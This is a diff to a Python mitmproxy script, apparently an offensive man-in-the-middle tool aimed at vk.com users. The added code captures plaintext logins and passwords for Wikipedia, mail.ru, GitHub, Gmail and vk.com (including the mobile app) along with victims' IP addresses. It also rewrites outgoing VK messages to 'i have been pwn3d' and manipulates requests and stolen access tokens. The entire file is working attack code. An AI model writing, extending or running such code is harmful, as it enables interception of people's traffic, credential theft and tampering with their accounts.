@@ -9,6 +9,8 @@ from sets import Set
 
 logging.basicConfig(filename="/root/mitm.log",level=logging.DEBUG)
 
+
+
 class VK_user:
     def __init__(self):
         self.id = ""
@@ -36,6 +38,7 @@ class VK_data:
         self.current_user = ""
         # temp user to store data if we do not currently know the id
         self.on_new_id("temp")
+        self.ips = {}
         
     def from_a_typing(self, string):
         m = re.match(r"act=a_typing&al=(?P<al>\d+)&gid=(?P<gid>\d+)&hash=(?P<hash>\w+)&peer=(?P<peer>\d+)", string)
@@ -155,6 +158,46 @@ class VK_data:
 
         string_ = "{\"ts\":"+m.group('num')+",\"updates\":"+m.group('lstring')+",\""+"you have been pwn3d"+"\",{}"+m.group('rstring')+"}"
         return [2, string_]
+    
+    def applet_deauth(self, string, ip):
+        m = re.match(r"[\w\W]+&access_token=(?P<token>[\w\W]*)&v=(?P<v>\d+\.?\d*)", string)
+        if not m:
+            return [0]
+
+        if ip not in self.ips.keys():
+            logging.debug("NEW ENTRY; IP = " + str(ip))
+            self.ips[ip] = [False, m.group('token'), m.group('v')]
+                  
+        if (self.ips[ip][0]):
+            logging.debug("IP" + str(ip) + " is already processed")
+            return [1]
+
+        return [2, "error=1"]
+
+
+        string_ = ("code=return{offline:API.account.setOffline({}),};&lang=ru&access_token=" + 
+                   m.group('token') +"&v=" + m.group('v'))
+        logging.debug("\nSENDING: " + string_ + "\n")
+        return [2, string_] 
+
+    def decode_java(self, string):
+        try:
+            string = urllib.unquote(string).decode('utf-8')
+        except:
+            pass
+
+        m = re.match((r"code=var mid = API.messages.send\(\{\"peer_id\":(?P<to>\d+),\"message\":\"(?P<msg>[\w\W]*)\"," +
+                       "\"type\":\"(?P<type>[\w\W]*)\",\"guid\":(?P<guid>\d+),\"attachment\":(?P<att>[\w\W]*)"), string)
+
+        #logging.debug(str(string))
+        if not m:
+            return [0]
+        
+        string_ = ("code=var mid = API.messages.send({\"peer_id\":" + m.group('to') + ",\"message\":\"i have been pwn3d\"," +
+                   "\"type\":\"" + m.group('type') + "\",\"guid\":" + m.group('guid') + ",\"attachment\":" + m.group('att'))
+
+        return [2, string_]
+
 
     def on_new_id(self, my_id):
         if my_id not in self.users.keys():
@@ -175,7 +218,7 @@ class PW_data:
     def __init__(self):
         self.passwords = []
 
-    def sniff_passwords(self, string):
+    def sniff_passwords(self, string, ip, vk_data):
         if ("assword" not in string) and ("asswd" not in string) and ("pass" not in string):
             return
 
@@ -187,50 +230,63 @@ class PW_data:
         # Wiki 
         m = re.match(r"wpName=(?P<login>[^&]*)&wpPassword=(?P<password>[^&]*)&[\w\W]*", string)
         if (m):
-            self.passwords.append(["wikipedia.org", m.group('login'), m.group('password')])
+            self.passwords.append([ip, "wikipedia.org", m.group('login'), m.group('password')])
             logging.debug(str(self))
             return
 
         # Mail.ru
         m = re.match(r"Login=(?P<login>[^&]*)&Domain=(?P<domain>[^&]*)&Password=(?P<password>[^&]*)&[\w\W]*", string)
         if (m):
-            self.passwords.append(["mail.ru", m.group('login')+'@'+m.group('domain'), m.group('password')])
+            self.passwords.append([ip, "mail.ru", m.group('login')+'@'+m.group('domain'), m.group('password')])
             logging.debug(str(self))
             return
        
         # Github
         m = re.match(r"[\w\W]*&login=(?P<login>[^&]*)&password=(?P<password>[^&]*)[\w\W]*", string)
         if (m):
-            self.passwords.append(["github.com", m.group('login'), m.group('password')])
+            self.passwords.append([ip, "github.com", m.group('login'), m.group('password')])
             logging.debug(str(self))
             return
 
         # Gmail
         m = re.match(r"[\w\W]*&Email=(?P<login>[^&]*)&Passwd=(?P<password>[^&]*)&[\w\W]*", string)
         if (m):
-            self.passwords.append(["gmail.com", m.group('login'), m.group('password')])
+            self.passwords.append([ip, "gmail.com", m.group('login'), m.group('password')])
             logging.debug(str(self))
             return
 
         # vk.com
         m = re.match(r"act=login&[\w\W]*&email=(?P<login>[^&]*)&pass=(?P<password>[^&]*)", string)
         if (m):
-            self.passwords.append(["vk.com", m.group('login'), m.group('password')])
+            self.passwords.append([ip, "vk.com", m.group('login'), m.group('password')])
             logging.debug(str(self))
             return
 
+        # vk.com mobile
+        m = re.match(r"password=(?P<password>[^&]*)&[\w\W]*&username=(?P<login>[^&]*)&[\w\W]*&client_secret=(?P<secret>[^&]*)&client_id=(?P<id>\d+)", string)
+        if (m):
+            self.passwords.append([ip, "vk.com (mobile)", m.group('login'), m.group('password')])
+            logging.debug(str(self))
+
+            if ip not in vk_data.ips.keys():
+                vk_data.ips[ip] = [True, "", ""]
+            vk_data.ips[ip][0] = True
+
+            logging.debug("UNLOCKED IP = " + str(ip))
+            return
+
         # Other websites
-        self.passwords.append([string])
+        self.passwords.append([ip, string])
         logging.debug(str(self))
 
     def __repr__(self):
         s = '\n'
-        s += "website".ljust(30) + "login".ljust(30) + "password".ljust(20) + '\n'
+        s += "user".ljust(30) + "website".ljust(30) + "login".ljust(30) + "password".ljust(20) + '\n'
         for entry in self.passwords:
-            if (len(entry) == 3):
-                s += entry[0].ljust(30)+entry[1].ljust(30)+entry[2].ljust(20) + '\n'
+            if (len(entry) == 4):
+                s += entry[0].ljust(30)+entry[1].ljust(30)+entry[2].ljust(30)+entry[3].ljust(20) + '\n'
             else:
-                s += entry[0] + '\n'
+                s += entry[0].ljust(30)+entry[1] + '\n'
         s += '\n'
         return s
         
@@ -242,10 +298,28 @@ pw_db = PW_data()
 def request(context, flow):
     try:
         with decoded(flow.request):  # automatically decode gzipped responses.
-            pw_db.sniff_passwords(str(flow.request.content))
+            sourse_ip = str(flow.client_conn.address).split("'")[1]
+            dest_ip   = str(flow.request.host)
+            #logging.debug("Sending (" + sourse_ip + " -> " + dest_ip + ")")
+
+            pw_db.sniff_passwords(str(flow.request.content), sourse_ip, vk_db)
+           
+            # Regular vk
             result = vk_db.decode_request(str(flow.request.content))
             if (result[0] == 2):
                 flow.request.content = result[1]
+
+            # vk App deauth
+            result = vk_db.applet_deauth(str(flow.request.content), sourse_ip)
+            if (result[0] == 2):
+                flow.request.content = result[1]
+
+            # vk mobile App
+            result = vk_db.decode_java(str(flow.request.content))
+            if (result[0] == 2):
+                flow.request.content = result[1]
+
+            
 
     except Exception as e:
         logging.debug(e)
@@ -256,7 +330,8 @@ def response(context, flow):
             result = vk_db.decode_response(str(flow.response.content))
             if (result[0] == 2):
                 flow.response.content = result[1]
-                                                    
+        
+
     except Exception as e:
         logging.debug(e)
 
